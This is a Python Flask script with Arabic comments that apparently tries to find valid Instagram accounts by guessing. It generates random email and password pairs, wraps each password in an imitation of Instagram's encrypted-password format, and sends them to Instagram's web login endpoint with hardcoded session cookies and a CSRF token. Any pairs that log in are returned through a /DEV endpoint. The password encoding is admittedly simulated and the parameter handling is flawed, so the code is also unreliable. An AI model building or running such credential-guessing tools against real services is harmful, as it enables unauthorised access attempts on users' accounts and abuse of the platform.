import asyncio
import httpx
import random
import string
import time
import urllib.parse
from flask import Flask, request, jsonify

app = Flask(__name__)

# إعدادات رأس الطلب
headers_3 = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=Gkw7DqmPPKn7BDiSoq3T3g; mid=Z2PuAAABAAFeV5Iuzmt09xb55VcF; datr=_-1jZ0qmMHtsAr4DKtL2l0wI; ig_did=2A397D63-984D-40B5-BA57-DB60077F2F76; ig_nrcb=1; ps_l=1; ps_n=1; dpr=2.225520610809326; wd=991x760',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-csrftoken': 'Gkw7DqmPPKn7BDiSoq3T3g',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1019074946',
    'x-requested-with': 'XMLHttpRequest',
    'x-web-session-id': 'eppwfx:aok9jd:4can4k',
}

# دالة لتوليد ايميل وكلمة مرور عشوائيين
def generate_random_credentials():
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return email, password

# دالة لتحويل كلمة المرور إلى الصيغة المطلوبة
def encode_password(password: str) -> str:
    # محاكاة العملية للتشفير المطلوب
    # هذا المثال محاكاة عبر `urllib.parse.quote`
    encoded_password = urllib.parse.quote(password)
    # إضافة الحروف المخصصة بناءً على المثال الذي قدمته
    custom_prefix = "%23PWD_INSTAGRAM_BROWSER%3A10%3A1735142877%3A"
    encoded_password = custom_prefix + encoded_password + "%2BseFQQCwfi%2BXerzcY3i4Ig%3D%3D"
    return encoded_password

# دالة لتخمين الحسابات
async def try_login(attempts, max_attempts):
    valid_accounts = []
    for attempt in range(attempts):
        email, password = generate_random_credentials()
        print(f"Attempt {attempt + 1}: Trying email {email} and password {password}")
        
        # تشفير كلمة المرور باستخدام الدالة الجديدة
        encoded_password = encode_password(password)
        
        login_data = {
            'enc_password': encoded_password,
            'username': email,
        }

        start_time = time.time()
        response_login = await httpx.AsyncClient().post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers_3, data=login_data)
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        if response_login.status_code == 200 and 'authenticated' in response_login.text:
            print(f"Login successful for {email}")
            valid_accounts.append({'email': email, 'password': password, 'time': elapsed_time})
        
        if len(valid_accounts) >= max_attempts:
            break

    return valid_accounts

# نقطة النهاية لتحديد عدد الحسابات
@app.route("/DEV", methods=["GET"])
def generate_accounts():
    attempts = int(request.args.get('max', 10))
    max_attempts = int(request.args.get('max', 3))
    
    if attempts <= 0 or max_attempts <= 0:
        return jsonify({"error": "Attempts and max_attempts must be greater than 0."}), 400
    
    # استخدم وظيفة try_login للحصول على الحسابات الصالحة
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    valid_accounts = loop.run_until_complete(try_login(attempts, max_attempts))
    
    if not valid_accounts:
        return jsonify({"message": "No valid accounts found after the specified attempts."})
    
    return jsonify({"valid_accounts": valid_accounts})

if __name__ == "__main__":
    app.run(debug=True)
